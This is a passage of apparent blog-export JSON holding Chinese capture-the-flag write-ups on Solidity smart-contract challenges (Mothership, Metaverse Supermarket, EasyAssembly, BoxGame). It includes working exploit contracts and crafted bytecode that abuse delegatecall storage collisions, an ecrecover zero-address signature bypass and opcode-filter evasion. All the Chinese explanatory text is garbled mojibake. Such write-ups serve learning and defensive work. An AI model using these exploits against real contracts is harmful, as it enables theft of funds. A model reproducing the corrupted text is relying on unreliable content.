ä¸ªå‡½æ•°å·²ç»å¯ä»¥æ»¡è¶³è¦æ±‚äº†ï¼Œdelegatacallè°ƒç”¨æœ€å®¹æ˜“å‘ç”Ÿçš„å°±æ˜¯æ’æ§½å†²çªä»è€Œå¯¼è‡´çš„è¦†ç›–ã€‚SpaceShipä¸­çš„_isCrewMemberå‡½æ•°ï¼Œéœ€è¦memberä¸ºcrewä¸­çš„æˆå‘˜æ‰è¿”å›trueï¼Œè€ŒRefuelModuleåˆçº¦ä¸­çš„addAlternativeRefuelStationsCodesï¼Œåˆ™ä¸ºæˆ‘æä¾›äº†ä½¿å¾—memberæˆä¸ºcrewä¸­çš„ä¸€å‘˜çš„å¯èƒ½æ€§ã€‚å†çœ‹åˆ°CleaningModuleåˆçº¦çš„replaceCleaningCompanyå‡½æ•°ä¸ºä¿®æ”¹captainçš„å€¼æä¾›äº†å¯è¡Œæ€§ã€‚å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç‚¹å¾ˆé‡è¦å°±æ˜¯è¦å…ˆæˆä¸ºcaptainï¼Œä¸ºäº†è°ƒç”¨addModuleå‡½æ•°ï¼Œå°†modules[LeadershipModule.isLeaderApproved.selector] å¯¹åº”çš„åœ°å€ä¿®æ”¹ä¸ºhackerçš„åœ°å€ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†æˆåŠŸMotherShipä¸­promoteToLeaderå‡½æ•°ä¸­çš„LeadershipModule(address(spaceship)).isLeaderApproved(_leader);*ï¼Œå› ä¸ºåŸå§‹çš„LeadershipModuleä¸­çš„è¯¥å‡½æ•°ä¸èƒ½è°ƒç”¨æˆåŠŸï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ç‚¹ç¹çï¼Œéœ€è¦é€šè¿‡forå¾ªç¯å°†fleetä¸­çš„5ä¸ªLeadershipModuleå…¨éƒ¨æ”¹æ‰ã€‚ å®Œæˆä¸Šè¿°æ­¥éª¤ä¹‹åï¼Œhackerå¯ä»¥æˆä¸ºleaderäº†ï¼Œç„¶åè°ƒç”¨hackå‡½æ•°ï¼Œæ”»å‡»è¯¥æ¯èˆ°ã€‚ ğŸ“Œ wocï¼Œåˆ†æå‡ºæ¥ä¹‹åï¼Œç„¶åé…·é…·å†™ä»£ç ï¼Œå†™äº†è¿™ä¹ˆå¤šï¼ï¼ï¼ï¼å±…ç„¶ä¸€æ¬¡å°±hackæˆåŠŸäº†ï¼ï¼ï¼ 3. solveæ”»å‡»åˆçº¦ æ”»å‡»é€»è¾‘ï¼šå…ˆéƒ¨ç½²LeadershipFakeï¼Œç„¶åéƒ¨ç½²MotherShipï¼Œå°†éƒ¨ç½²å‡ºæ¥çš„mothershipåœ°å€ç”¨äºéƒ¨ç½²MotherShipHackerï¼Œç„¶åå°†LeadshipFakeä¼ å…¥attackå‡½æ•°ä¸­ï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243contract MotherShipHacker &#123; Mothership mothership; SpaceShip spaceship; constructor(address _mothership) &#123; mothership = Mothership(_mothership); spaceship = mothership.fleet(0); &#125; function attack(address leadershipFake) public &#123; // change spaceship&#x27;s LeadershipModule for (uint i; i &lt; 5; i++) &#123; SpaceShip _spaceship = mothership.fleet(i); // become SpaceShip&#x27;s captain address(_spaceship).call(abi.encodeWithSelector(CleaningModule.replaceCleaningCompany.selector, address(this))); _spaceship.addModule(bytes4(abi.encodeWithSignature(&quot;isLeaderApproved(address)&quot;)), leadershipFake); &#125; /* operate the spaceship */ // change spaceship&#x27;s captain to address(0) address(spaceship).call(abi.encodeWithSelector(CleaningModule.replaceCleaningCompany.selector, address(0))); // push hacker into crew address(spaceship).call(abi.encodeWithSelector(RefuelModule.addAlternativeRefuelStationsCodes.selector, uint(uint160(address(this))))); // call MotherShip&#x27;s assignNewCaptainToShip spaceship.askForNewCaptain(address(this)); // become MotherShi&#x27;s leader mothership.promoteToLeader(address(this)); // hack the mothership mothership.hack(); require(mothership.hacked(), &quot;The mothership is not been hacked...&quot;); &#125;&#125;contract LeadershipFake &#123; function isLeaderApproved(address) external pure &#123;&#125;&#125; Metaverse Supermarket1.question We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. Stability has become a scarce resource and even going to the store is a painful experience: we need to rely on oracles that sign off-chain data that lasts a couple of blocks because updating prices on-chain would be complete madness.You are out of INFLAs and you are starving, can you defeat the system? æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112// SPDX-License-Identifier: MITpragma solidity 0.8.17;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/25fe191202c44c762bc2a933913e21b37200f0e9/contracts/utils/cryptography/EIP712.sol&quot;;struct OraclePrice &#123; uint256 blockNumber; uint256 price;&#125;struct Signature &#123; uint8 v; bytes32 r; bytes32 s;&#125;abstract contract InflaStoreEIP712 is EIP712 &#123; bytes32 public constant ORACLE_PRICE_TYPEHASH = keccak256(&quot;OraclePrice(uint256 blockNumber,uint256 price)&quot;); function _hashOraclePrice(OraclePrice memory oraclePrice) internal view returns (bytes32 hash) &#123; return _hashTypedDataV4( keccak256(abi.encode(ORACLE_PRICE_TYPEHASH, oraclePrice.blockNumber, oraclePrice.price)) ); &#125;&#125;/// @title Metaverse Supermarket/// @author https://twitter.com/adrianromero/// @notice We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. You are out of INFLAs and you are starving, can you defeat the system?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/metaverse-supermarketcontract InflaStore is InflaStoreEIP712 &#123; Meal public immutable meal; Infla public immutable infla; address private owner; address private oracle; uint256 public constant MEAL_PRICE = 1e6; uint256 public constant BLOCK_RANGE = 10; constructor(address player) EIP712(&quot;InflaStore&quot;, &quot;1.0&quot;) &#123; meal = new Meal(); infla = new Infla(player, 10); owner = msg.sender; &#125; function setOracle(address _oracle) external &#123; require(owner == msg.sender, &quot;!owner&quot;); oracle = _oracle; &#125; function buy() external &#123; _mintMeal(msg.sender, MEAL_PRICE); &#125; function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external &#123; _validateOraclePrice(oraclePrice, signature); _mintMeal(msg.sender, oraclePrice.price); &#125; function _mintMeal(address buyer, uint256 price) private &#123; infla.transferFrom(buyer, address(this), price); meal.safeMint(buyer); &#125; function _validateOraclePrice(OraclePrice calldata oraclePrice, Signature calldata signature) private view &#123; require(block.number - oraclePrice.blockNumber &lt; BLOCK_RANGE, &quot;price too old!&quot;); bytes32 oracleHash = _hashOraclePrice(oraclePrice); address recovered = _recover(oracleHash, signature.v, signature.r, signature.s); require(recovered == oracle, &quot;not oracle!&quot;); &#125; function _recover(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) &#123; require(v == 27 || v == 28, &quot;invalid v!&quot;); return ecrecover(digest, v, r, s); &#125;&#125;import &quot;https://github.com/transmissions11/solmate/blob/c2594bf4635ad773a8f4763e20b7e79582e41535/src/tokens/ERC721.sol&quot;;contract Meal is ERC721(&quot;Meal&quot;, &quot;MEAL&quot;) &#123; address private immutable _owner; uint256 private _tokenIdCounter; constructor() &#123; _owner = msg.sender; &#125; function safeMint(address to) external &#123; require(_owner == msg.sender, &quot;Only owner can mint&quot;); uint256 tokenId = _tokenIdCounter; unchecked &#123; ++_tokenIdCounter; &#125; _safeMint(to, tokenId); &#125; function tokenURI(uint256) public pure override returns (string memory) &#123; return &quot;ipfs://QmQqCFY7Dt9SFgadayt8eeTr7i5XauiswxeLysexbymGp1&quot;; &#125;&#125;import &quot;https://github.com/transmissions11/solmate/blob/c2594bf4635ad773a8f4763e20b7e79582e41535/src/tokens/ERC20.sol&quot;;contract Infla is ERC20(&quot;INFLA&quot;, &quot;INF&quot;, 18) &#123; constructor(address player, uint256 amount) &#123; _mint(player, amount); &#125;&#125; 2. analysis è¿™é“é¢˜è¦æ±‚æ˜¯è®©è‡ªå·±ä¸æŒ¨é¥¿ï¼Œä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æ‹¥æœ‰mealï¼Œå³ERC721ä»£å¸ä¸ä¸ºé›¶ï¼Œè€Œèƒ½é“¸å¸çš„å‡½æ•°åªæœ‰ä¸¤ä¸ªï¼Œbuy() å’Œ buyUsingOracle()ï¼Œæƒ³è¦â€œåƒé¥­â€å¿…é¡»è¦æœ‰MEAL_PRICEè¿™ä¹ˆå¤šé’±ï¼Œè€Œæˆ‘ä»¬æ‰‹ä¸­çš„é’±è¿œè¿œä¸å¤Ÿï¼Œæ‰€ä»¥ï¼Œåªèƒ½é€šè¿‡buyUsingOracle()å‡½æ•°ã€‚åˆ†æ_validateOraclePrice()å‡½æ•°ï¼Œè¦æ±‚ä¼ å…¥ä¸¤ä¸ªç»“æ„ä½“ï¼Œé€šè¿‡OraclePriceè·å–ç­¾åï¼Œä¸”ç­¾åç»“æœå·²è¢«å›ºå®šç®—æ³•ç”Ÿæˆäº†ï¼Œæ‰€ä»¥è¿™å‡ ä¹æ˜¯ä¸å¯èƒ½é€šè¿‡recoveræ¢å¤å‡ºçš„åœ°å€å’Œoracleç›¸åŒï¼ˆ*å½“ç„¶ï¼Œè¿™æ˜¯åœ¨oracleè¢«åˆå§‹åŒ–çš„æƒ…å†µä¸‹ï¼Œä½†å®é™…ä¸Šï¼Œè¯¥oracleå¹¶æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œå…¶å€¼ä¸ºaddress(0)ï¼‰æ‰€ä»¥ï¼Œè¿™è¦è®©_recover(oracleHash, signature.v, signature.r, signature.s)è¿”å›address(0)å³å¯ã€‚ å¦‚ä½•è¿”å›address(0)å‘¢ï¼Œåªè¦è®©ecrecoveråœ¨è®¡ç®—è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯å³å¯è¿”å›address(0)é‚£ä¹ˆè¯¥å¦‚ä½•å‡ºé”™å‘¢ï¼Œ æŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼Œåªéœ€è®©signature.v ä¸ç­‰äº27æˆ–28ï¼Œæˆ–signature.r=0ï¼Œæˆ–signature.s=0å³å¯ã€‚ è¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯æƒ³è¦é€šè¿‡Inflaåˆçº¦ï¼Œè®©playerç»™InflaStoreåˆçº¦æˆæƒï¼Œä¸ºäº†æ‰§è¡Œinfla.transferFrom(buyer, address(this), price);ï¼ŒåŒæ—¶hackeråˆçº¦éœ€è¦å®ç°IERC721Receiveræ¥å£ï¼Œå¦åˆ™ï¼Œ meal.safeMint(buyer);å°†æ— æ³•æ‰§è¡Œã€‚ 3. solveæ”»å‡»é€»è¾‘ï¼šå…ˆéƒ¨ç½²hackerï¼Œè®©hackeræˆä¸ºInflaStoreçš„playerï¼Œå†ç„¶åï¼Œè°ƒç”¨attackä¼ å…¥inflastoreï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚ æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445interface IERC721Receiver &#123; function onERC721Received( address operator, address from, uint256 tokenId, bytes calldata data ) external returns (bytes4);&#125;contract SupermarketHacker is IERC721Receiver &#123; InflaStore store; Meal meal; Infla infla; address hacker; function attack(address _store) public &#123; // init store = InflaStore(_store); meal = store.meal(); hacker = msg.sender; infla = store.infla(); // create signature Signature memory signature = Signature(27, 0, 0); // create oracleprice OraclePrice memory oracleprice = OraclePrice(block.number, 1); // ERC20 approve infla.approve(address(store), type(uint).max); // mint meal store.buyUsingOracle(oracleprice, signature); require(meal.balanceOf(address(this)) &gt; 0, &quot;you have not meal, you still stave...&quot;); &#125; function onERC721Received( address, address, uint256, bytes calldata ) external virtual returns (bytes4) &#123; return IERC721Receiver.onERC721Received.selector; &#125;&#125; å—¯å“¼ï¼Œæ”¶å·¥~ğŸ¤ª","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"CTFProtocol","slug":"CTFS/CTFProtocol","permalink":"https://biyouqiuqiu.com/categories/CTFS/CTFProtocol/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"opcodes(7)âŒ","slug":"CTFS/ChainFlag/opcodes/opcodes(7)","date":"2023-08-27T07:10:10.000Z","updated":"2023-08-27T07:10:10.000Z","comments":true,"path":"2023/08/27/CTFS/ChainFlag/opcodes/opcodes(7)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/27/CTFS/ChainFlag/opcodes/opcodes(7)/","excerpt":"","text":"EasyAssembly1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109pragma solidity ^0.5.10;contract EasyAssembly &#123; event SendFlag(address addr); uint randomNumber = 0; bytes32 private constant ownerslot = keccak256(&#x27;Welcome to qwb!!! You will find this so easy ~ Happy happy :D&#x27;); bytes32[] public puzzle; uint count = 0; mapping(address=&gt;bytes32) WinChecksum; constructor() public payable &#123; setAddress(ownerslot, msg.sender); &#125; modifier onlyWin(bytes memory code) &#123; require(WinChecksum[msg.sender] != 0); bytes32 tmp = keccak256(abi.encodePacked(code)); address target; assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1) &#125; require(address(target)==msg.sender); _; &#125; function setAddress(bytes32 _slot, address _address) internal &#123; bytes32 s = _slot; assembly &#123; sstore(s, _address) &#125; &#125; function deploy(bytes memory code) internal returns(address addr) &#123; assembly &#123; addr := create2(0, add(code, 0x20), mload(code), 0x1234) if eq(extcodesize(addr), 0) &#123; revert(0, 0) &#125; &#125; &#125; function gift() public payable &#123; require(count == 0); count += 1; if(msg.value &gt;= address(this).balance)&#123; emit SendFlag(msg.sender); &#125;else&#123; selfdestruct(msg.sender); &#125; &#125; function pass(uint idx, bytes memory bytecode) public &#123; address addr = deploy(bytecode); bytes32 cs = tag(bytecode); bytes32 tmp = keccak256(abi.encodePacked(uint(1))); uint32 v; bool flag = false; assembly &#123; let v1,v2 v := sload(add(tmp, idx)) if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125; &#125; if(flag)&#123; WinChecksum[addr] = cs; &#125;else&#123; WinChecksum[addr] = bytes32(0); &#125; &#125; function tag(bytes memory a) pure public returns(bytes32 cs) &#123; assembly&#123; let groupsize := 16 let head := add(a,groupsize) let tail := add(head, mload(a)) let t1 := 0x13145210 let t2 := 0x80238023 let m1,m2,m3,m4,s,tmp for &#123; let i := head &#125; lt(i, tail) &#123; i := add(i, groupsize) &#125; &#123; s := 0x59129121 tmp := mload(i) m1 := and(tmp,0xffffffff) m2 := and(shr(0x20,tmp),0xffffffff) m3 := and(shr(0x40,tmp),0xffffffff) m4 := and(shr(0x60,tmp),0xffffffff) for &#123; let j := 0 &#125; lt(j, 0x4) &#123; j := add(j, 1) &#125; &#123; s := and(mul(s, 2),0xffffffff) t2 := and(add(t1, xor(sub(mul(t1, 0x10), m1),xor(add(t1, s),add(div(t1,0x20), m2)))), 0xffffffff) t1 := and(add(t2, xor(add(mul(t2, 0x10), m3),xor(add(t2, s),sub(div(t2,0x20), m4)))), 0xffffffff) &#125; &#125; cs := xor(mul(t1,0x100000000),t2) &#125; &#125; function payforflag(bytes memory code) public onlyWin(code) &#123; emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125;&#125; è§¦å‘ emit SendFlag(msg.sender); 2. analysis è¿™é¢˜å¡åœ¨äº†ä¸ä¼šç®— CS çºµè§‚ä»£ç ï¼Œå¯çŸ¥è§¦å‘ emit SendFlag(msg.sender);çš„æœ‰giftï¼Œpayforflagå‡½æ•°ï¼Œä½†æ˜¯ç”±ä¹‹å‰çš„ç»éªŒå¯çŸ¥msg.valueæ°¸è¿œä¸å¯èƒ½å¤§äºaddress(this).balanceï¼Œåªæœ‰payforflagæœ‰å¸Œæœ›ã€‚ åˆ†æpayforflagï¼Œåªè¦é€šè¿‡äº† onlyWin ä¿®é¥°å™¨ï¼Œå°±å¯ä»¥æˆåŠŸè°ƒç”¨ã€‚ åˆ†æonlyWinï¼Œéœ€è¦WinChecksum[msg.sender] != 0ï¼Œè¿™éœ€è¦åœ¨ passå‡½æ•°ä¸­æ‰èƒ½å®ç°ï¼Œç»§ç»­å¾€ä¸‹çœ‹ 1234567891011121314bytes32 tmp = keccak256(abi.encodePacked(code));address target;/* ç‰›çš„ï¼šè¿™ä¸€é¡¿æ“ä½œï¼Œå…¶å®å°±æ˜¯å– temçš„å20bytes*/assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1)&#125;require(address(target)==msg.sender);_; åˆ†æå¯çŸ¥ï¼Œæ±‡ç¼–çš„ä½œç”¨å°±æ˜¯ï¼Œæˆªå–temçš„å20bytesï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåœ°å€çš„é•¿åº¦ã€‚ é‚£ä¹ˆå¦‚ä½•å®ç°ï¼Œaddress(target)&#x3D;&#x3D;msg.sender)ï¼Œå…¶å®å¾ˆç®€å•ï¼Œåªè¦çŸ¥é“create2çš„å·¥ä½œåŸç†å°±å¾ˆç®€å•ï¼Œå…¶å®address = address(uint1600(uint(keccak256(abi.encodePacked(0xFF,address(deployer),salt,keccak256(abi.encodePacked(bytecode)))))))ï¼Œç®€å•è¯´æ¥å°±æ˜¯ï¼š*keccak256(0xff||deployer||salt||keccak256(bytecode))*ï¼Œæ‰€ä»¥ä¼ å…¥çš„å½¢å‚codeï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å°†å…¶æ‹¼æ¥å¥½ã€‚ åˆ†æpasså‡½æ•°ï¼Œå…¶ä¸­çš„æ±‡ç¼–å¦‚ä¸‹ï¼š 12345678910111213141516171819/* å¦‚ä¸‹æ±‡ç¼–å¯ä»¥ç†è§£ä¸ºï¼š å°†32bytesçš„temï¼Œ8ä¸ªbytesçš„å—ï¼›s7ï¼Œs6ï¼Œs5ï¼Œs4ï¼Œs3ï¼Œs2ï¼Œs1ï¼Œs0 v1 = (s0 + s1 + 0xffffffff) &amp;&amp; 0xffffffff v2 = ((s3 ^ s4) + s5) &amp;&amp; 0xffffffff å°† v1 æ‹¼æ¥åˆ° v2 åé¢ï¼Œ å†å’Œ cs åšæ¯”è¾ƒ*/assembly &#123; let v1,v2 v := sload(add(tmp, idx)) // éœ€è¦æ‰¾åˆ°ä¸€ä¸ªslotçš„å€¼ä¸ä¸º0çš„ if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125;&#125; æ±‡ç¼–ä¸­çš„vå¯ä»¥ä»¤å…¶add(tem,idx)çš„å€¼ç­‰äºslot_ownerslotå³å¯ï¼Œè¿™ä¸ªåº”è¯¥ä¸éš¾ç®—ï¼Œidx&#x3D;slot_ownerslot-temå³å¯ã€‚è¿™é‡Œxor(mul(v2,0x100000000), v1)çš„å€¼æ˜¯è¢«å›ºå®šäº†çš„ï¼Œå³å¯¹keccak256(abi.encodePacked(uint(1)))è¿›è¡Œä¸€ç³»åˆ—æ“ä½œå¾—åˆ°çš„ï¼Œæ‰€ä»¥èƒ½è®©ä»–ä»¬ä¿©ç›¸ç­‰çš„å”¯ä¸€åŠæ³•å°±æ˜¯æ§åˆ¶csçš„å€¼ã€‚ åˆ†ætagå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±å¾ˆææ€–äº†ã€‚ã€‚ã€‚ã€‚ æˆ‘æš‚æ—¶ä¸ä¼šï¼Œè¿™é‡Œæ˜¯å¤§ä½¬çš„åšå®¢ï¼š link 3. solve1// It is difficult for me.... BoxGame1. questionæºç  12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; constructor(bytes memory a) payable public &#123; assembly &#123; return(add(0x20, a), mload(a)) &#125; &#125; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; æˆ‘æ˜¯çœŸä¸çŸ¥é“å¤§ä½¬æ˜¯æ€ä¹ˆçœ‹å‡ºæ¥ï¼Œè¿™ä¸æ˜¯çœŸæ­£çš„åˆçº¦ï¼ŒçœŸæ­£éƒ¨ç½²åˆ°è„¸ä¸Šçš„åˆçº¦æ˜¯ï¼Œæ„é€ å™¨è¿”å›çš„aï¼Œæˆ‘ç›´æ¥äºšéº»å‘†ä½äº†ï¼Œå¦‚ä¸‹æ˜¯ RealContractï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; æˆ‘ç›´å‘¼ 666ï¼Œè¿™é¢˜çš„ç›®çš„æ˜¯è§¦å‘ ForFlagäº‹ä»¶ã€‚ 2. analysis è¿™é¢˜è¦æ±‚æˆ‘ä»¬ï¼Œåœ¨ä¼ å…¥çš„ _addrçš„runtimeCodeä¸­ï¼Œä¸å‡ºç°0xf0 0xf1 0xf2 0xf4 0xfa 0xffï¼Œè¿™å°±éœ€è¦æ„å»º bytecodeäº†ã€‚ delegatecallå¯ä»¥åˆ©ç”¨å…¶ç‰¹æ€§ï¼Œåœ¨addrä¸­è§¦å‘ ForFlagï¼Œå®é™…ä¸Šè§¦å‘çš„æ˜¯BoxGameä¸­ForFlagã€‚ è€Œä¸”ï¼Œé€šè¿‡å¯¹å†…è”æ±‡ç¼– log1çš„å­¦ä¹ ï¼Œå…¶å®åœ¨æ”»å‡»åˆçº¦ä¸­å¯ä»¥ä¸å®šä¹‰ eventï¼ˆåŒæ–‡ä»¶ä¸‹å…¶ä»–åˆçº¦ä¸­å®šä¹‰äº†å³å¯ï¼Œè¯¦æƒ…è¯·çœ‹ï¼šè¿™é‡Œï¼‰ï¼Œå°½é‡ç®€åŒ–æ”»å‡»åˆçº¦ï¼Œå°½å¯èƒ½å°†æ”»å‡»åˆçº¦çš„bytecodeæœ€å°åŒ–ã€‚ _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;))ï¼Œå¾ˆæ˜æ˜¾éœ€è¦åœ¨hackeråˆçº¦ä¸­ç¼–å†™å›è°ƒå‡½æ•°ï¼Œåœ¨å†…è”æ±‡ç¼–ä¸­ï¼Œlog1(offset, size, topic)å…¶ä¸­topicæ˜¯äº‹ä»¶çš„hashï¼Œæœ¬é¢˜æ˜¯ï¼Œkeccak256(abi.encodePacked(&quot;ForFlag(address)&quot;))ï¼Œå¯ä»¥ç®€å•é€šè¿‡ cast æŒ‡ä»¤ç®—å‡ºï¼Œå¦‚ä¸‹ æŒ‰ç†æ¥è¯´ï¼Œæ”»å‡»å‡½æ•°å¯ä»¥å†™æˆï¼Œå¦‚ä¸‹ 12345678910111213contract BoxGameHacker &#123; function() external &#123; address owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; bytes32 eventHash = keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;)); assembly &#123; mstore(0x80, owner) log1(0x80, 0x20, eventHash) &#125; &#125;&#125; å…¶å®ä¸ç”¨è¯•ä¹ŸçŸ¥é“ï¼Œè¿™ä¸ªhackeråˆçº¦ä¸­çš„runtimecodeä¸è¡Œï¼Œå› ä¸ºï¼Œåœ¨keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;))ä¸­å·²ç»å‡ºç°äº†ï¼Œf0å’Œf1(å…¶å®è¿™ä¸æ˜¯f1ï¼Œè€Œæ˜¯0fï¼Œ1fä¸è¿‡ä¸ç®¡äº†ï¼Œé—®é¢˜ä¸å¤§)ï¼Œæ‰€ä»¥å¯å°†è¿™ä¸ªå€¼æ‹†åˆ†ä¸ºå¦‚ä¸‹ï¼š 1234567bytes32 eventHash = 0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e2;uint v = 0x100000000000000000000000000000000001000000000000000000;assembly &#123; mstore(0x80, owner) log1(0x80, 0x20, add(eventHash, v))&#125; 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2=0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e2+0x100000000000000000000000000000000001000000000000000000è¿™æ ·å°±é¿å…äº†f0å’Œf1ã€‚ æ­¤æ—¶çš„bytecodeä¸º 10x6080604052348015600f57600080fd5b5060b780601d6000396000f3fe6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 runtimecodeä¸º 10x6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 metadataä¸º 10xfea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 ä½†æ˜¯ï¼Œbytecodeä¸­è¿˜æ˜¯æœ‰f4,fa,ffï¼Œä½†æ˜¯è¿™ä¸‰ä¸ªæ°å¥½åœ¨metadataéƒ¨åˆ†ï¼Œä½¿ç”¨create2åˆ›å»ºåˆçº¦çš„æ—¶å€™ï¼Œå°†bytecodeä¸­çš„metadataéƒ¨åˆ†åˆ æ‰ï¼Œå…¶å®ä¸ä¼šå½±å“åˆçº¦çš„åˆ›å»ºï¼Œmetadataå­¦ä¹ ã€‚ å…ˆè®¡ç®—è¯¥bytecodeä¸­çš„runtimecodeçš„é•¿åº¦ï¼Œè®¡ç®—ç»“æœä¸º0x82 æ•…ç›´æ¥ä¿®æ”¹éƒ¨ç½²å­—èŠ‚ç ï¼Œå°†returnçš„é•¿åº¦ä¿®æ”¹ä¸º0x82ï¼Œå»é™¤æœ€åçš„éƒ¨åˆ†å³å¯ æœ€åçš„bytecodeä¸º 10x6080604052348015600f57600080fd5b50608280601d6000396000f3fe6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a72315820048f42c13217b95d2c73187effa267c0fc8d0018eae54833b5fc94fe028682ec64736f6c63430005110032 runtimecodeä¸º(å› ä¸ºé•¿åº¦ç”±åŸæ¥çš„0xb7å˜æˆäº†0x82) 10x6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000 è€Œåœ¨BoxGameåˆçº¦ä¸­ï¼Œextcodecopyè·å–åˆ°çš„codeä¸ºï¼Œå¦‚ä¸Šruntimecodeå³ä¸åŒ…æ‹¬(0xf0 0xf1 0xf2 0xf4 0xfa 